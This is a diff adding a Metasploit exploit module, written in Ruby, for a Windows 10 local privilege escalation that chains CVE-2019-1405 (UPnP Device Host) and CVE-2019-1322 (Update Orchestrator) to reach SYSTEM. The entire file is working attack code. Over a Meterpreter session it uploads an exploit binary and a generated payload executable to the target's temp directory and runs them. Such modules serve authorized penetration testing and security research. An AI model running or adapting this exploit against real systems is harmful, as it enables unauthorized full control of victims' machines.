@@ -1,0 +1,149 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/post/common'
+require 'msf/core/post/file'
+require 'msf/core/post/windows/priv'
+require 'msf/core/post/windows/registry'
+require 'msf/core/exploit/exe'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::Common
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Microsoft UPnP Local Privilege Elevation Vulnerability',
+      'Description'    => %q(
+      This exploit uses two vulnerabilities to execute a command as an elevated user.
+      The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to
+      NT AUTHORITY\LOCAL SERVICE
+      The second (CVE-2019-1322) leverages the Update Orchestrator Service to
+      elevate from NT AUTHORITY\LOCAL SERVICE to NT AUTHORITY\SYSTEM.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'NCC Group',            # Original discovery (https://www.nccgroup.trust/uk/)
+          'hoangprod',            # PoC
+          'bwatters-r7'           # msf module
+        ],
+      'Platform'       => ['win'],
+      'SessionTypes'   => ['meterpreter'],
+      'Targets'        =>
+        [
+          ['Windows x64', { 'Arch' => ARCH_X64 }]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Nov 12 2019',
+      'References'     =>
+        [
+          ['CVE', '2019-1322'],
+          ['CVE', '2019-1405'],
+          ['EDB', '47684'],
+          ['URL', 'https://github.com/apt69/COMahawk'],
+          ['URL', 'https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/'],
+          ['URL', 'https://fortiguard.com/threat-signal-report/3243/new-proof-of-concept-combining-cve-2019-1322-and-cve-2019-1405-developed-1']
+        ],
+      'DefaultOptions' =>
+        {
+          'DisablePayloadHandler' => false
+        }
+    ))
+
+    register_options([
+      OptString.new('EXPLOIT_NAME',
+        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
+      OptString.new('PAYLOAD_NAME',
+        [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),
+      OptString.new('WRITABLE_DIR',
+        [false, 'Path to write binaries (%TEMP% by default).', nil]),
+      OptInt.new('EXPLOIT_TIMEOUT',
+        [true, 'The number of seconds to wait for exploit to finish running', 60]),
+      OptInt.new('EXECUTE_DELAY',
+        [true, 'The number of seconds to delay between file upload and exploit launch', 3])
+    ])
+  end
+
+  def exploit
+    exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(6..14)
+    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(6..14)
+    exploit_name = "#{exploit_name}.exe" unless exploit_name.end_with?('.exe')
+    payload_name = "#{payload_name}.exe" unless payload_name.end_with?('.exe')
+    temp_path = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')
+    payload_path = "#{temp_path}\\#{payload_name}"
+    exploit_path = "#{temp_path}\\#{exploit_name}"
+    payload_exe = generate_payload_exe
+
+    # Check target
+    vprint_status("Checking Target")
+    validate_active_host
+    validate_target
+    fail_with(Failure::BadConfig, "#{temp_path} does not exist on the target") unless directory?(temp_path)
+
+    # Upload Exploit
+    vprint_status("Uploading exploit to #{sysinfo['Computer']} as #{exploit_path}")
+    ensure_clean_destination(exploit_path)
+    exploit_bin = exploit_data('cve-2019-1322', 'CVE-2019-1322-EXE.exe')
+    write_file(exploit_path, exploit_bin)
+    print_status("Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}")
+
+    # Upload Payload
+    vprint_status("Uploading Payload")
+    ensure_clean_destination(payload_path)
+    write_file(payload_path, payload_exe)
+    print_status("Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}")
+    print_warning("This exploit requires manual cleanup of the payload #{payload_path}")
+
+    # Run Exploit
+    vprint_status("Running Exploit")
+    print_status("It may take a moment after the session is established for the exploit to exit safely.")
+    begin
+      cmd_exec('cmd.exe', "/c #{exploit_path} #{payload_path}", 60)
+    rescue Rex::TimeoutError => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      print_error("Caught timeout.  Exploit may be taking longer or it may have failed.")
+    end
+    vprint_status("Cleaning up #{exploit_path}")
+    ensure_clean_destination(exploit_path)
+  end
+
+  def validate_active_host
+    begin
+      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
+    rescue Rex::Post::Meterpreter::RequestError => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      raise Msf::Exploit::Failed, 'Could not connect to session'
+    end
+  end
+
+  def validate_target
+    if sysinfo['Architecture'] == ARCH_X86
+      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
+    end
+    sysinfo_value = sysinfo['OS']
+    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
+    vprint_status("Build Number = #{build_num}")
+    unless sysinfo_value =~ /10/ && (build_num > 17133 && build_num < 18362)
+      fail_with(Failure::NotVulnerable, 'The exploit only supports Windows 10 build versions 17133-18362')
+    end
+  end
+
+  def ensure_clean_destination(path)
+    return unless file?(path)
+    print_status("#{path} already exists on the target. Deleting...")
+    begin
+      file_rm(path)
+      print_status("Deleted #{path}")
+    rescue Rex::Post::Meterpreter::RequestError => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      print_error("Unable to delete #{path}")
+    end
+  end
+end
